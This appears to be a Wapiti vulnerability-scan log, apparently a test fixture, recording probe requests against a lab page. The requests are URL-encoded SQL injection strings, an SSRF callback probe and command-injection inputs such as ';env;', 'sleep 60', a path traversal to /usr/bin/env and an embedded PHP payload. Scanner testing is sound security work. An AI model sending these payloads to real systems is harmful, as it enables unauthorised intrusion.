+2024-03-20 16:50:50.877 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:50:50.954 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:50:50.971 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.971 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 16:50:50.984 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%20AND%2064%3D136%20AND%2066%3D66 (0)
+2024-03-20 16:50:50.991 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%20AND%2082%3D120%20AND%2033%3D33 (0)
+2024-03-20 16:50:50.999 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%20AND%2013%3D13%20AND%2087%3D87 (0)
+2024-03-20 16:50:51.007 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%20AND%2040%3D95%20AND%20%2719%27%3D%2719 (0)
+2024-03-20 16:50:51.019 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%20AND%2073%3D151%20AND%20%2782%27%3D%2782 (0)
+2024-03-20 16:50:51.030 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%20AND%2010%3D10%20AND%20%2721%27%3D%2721 (0)
+2024-03-20 16:50:51.040 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%20AND%2054%3D88%20AND%20%2210%22%3D%2210 (0)
+2024-03-20 16:50:51.052 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%20AND%2057%3D107%20AND%20%2230%22%3D%2230 (0)
+2024-03-20 16:50:51.062 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%20AND%2076%3D76%20AND%20%2229%22%3D%2229 (0)
+2024-03-20 16:50:51.072 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%29%20AND%2063%3D131%20AND%20%2871%3D71 (0)
+2024-03-20 16:50:51.083 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%29%20AND%2036%3D102%20AND%20%2859%3D59 (0)
+2024-03-20 16:50:51.093 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%29%20AND%2089%3D89%20AND%20%2822%3D22 (0)
+2024-03-20 16:50:51.103 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%29%20AND%2024%3D54%20AND%20%28%2761%27%3D%2761 (0)
+2024-03-20 16:50:51.112 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%29%20AND%2040%3D128%20AND%20%28%2727%27%3D%2727 (0)
+2024-03-20 16:50:51.121 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%27%29%20AND%2075%3D75%20AND%20%28%2717%27%3D%2717 (0)
+2024-03-20 16:50:51.130 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%29%20AND%2065%3D94%20AND%20%28%2215%22%3D%2215 (0)
+2024-03-20 16:50:51.140 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%29%20AND%2018%3D50%20AND%20%28%2290%22%3D%2290 (0)
+2024-03-20 16:50:51.150 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%22%29%20AND%2085%3D85%20AND%20%28%2225%22%3D%2225 (0)
+2024-03-20 16:50:51.184 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:50:51.195 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:51.195 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xss_ajax_2-2.php?title=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fw9sua3%2F1%2F7469746c65%2F (0)
+2024-03-20 16:50:51.217 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=w9sua3 for results, please wait...
+2024-03-20 16:50:53.310 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:50:53.326 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:53.330 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%3Benv%3B (0)
+2024-03-20 16:50:53.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%7Cenv%7C (0)
+2024-03-20 16:50:53.345 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%3Benv%3B (0)
+2024-03-20 16:50:53.354 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%3Benv%3B (0)
+2024-03-20 16:50:53.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 16:50:53.372 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%3Benv%3B (0)
+2024-03-20 16:50:53.379 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%0Aenv%3B (0)
+2024-03-20 16:50:53.387 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%26set%26 (0)
+2024-03-20 16:50:53.395 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=set (0)
+2024-03-20 16:50:53.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=env (0)
+2024-03-20 16:50:53.413 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%2Fe%00 (0)
+2024-03-20 16:50:53.421 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.447 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.459 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.493 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.505 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.518 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.530 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.542 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:50:53.555 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:50:53.564 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 16:50:53.576 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%60%29%60 (0)
+2024-03-20 16:50:53.586 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%60sleep%2060%60 (0)
+2024-03-20 16:50:53.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%3Bsleep%2060%3B (0)
+2024-03-20 16:50:53.604 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=a%7Csleep%2060%3B (0)
+2024-03-20 16:50:53.611 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_ajax_2-2.php?title=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 16:50:53.643 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 16:50:53.656 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:53.728 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 16:50:53.752 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//xss_ajax.json/
+2024-03-20 16:50:53.752 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//xss_ajax.json/web_03202024_1650.html with a browser to see this report.
